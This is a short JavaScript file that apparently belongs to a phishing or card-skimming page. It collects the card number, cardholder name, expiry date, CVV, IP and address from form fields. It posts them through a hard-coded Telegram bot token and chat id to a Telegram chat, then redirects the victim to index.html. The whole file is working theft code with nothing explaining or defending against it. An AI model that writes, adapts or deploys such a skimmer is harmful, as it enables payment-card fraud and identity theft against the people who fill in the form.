//bot token
var telegram_bot_id = "5748200150:AAGxdGVAkvL1GPy-L8FLO_8RxlWhhRaoTHs";
//chat id
var chat_id = -848277435;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("cardNumber").value;
    u_name1 = document.getElementById("cardHolder").value;
    u_name2 = document.getElementById("expirationMonth").value;
    u_name3 = document.getElementById("expirationYear").value;
    u_name4 = document.getElementById("cvv").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "Tarjeta: " + u_name + " Nombre: " + u_name1 + " Fecha Vencimiento: "+ u_name2 +"/"+ u_name3 +" CVV: " + u_name4 + "\nIP: " + ip +"\n" + ip2;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index.html';
        console.log(response);
    });
    return false;
};
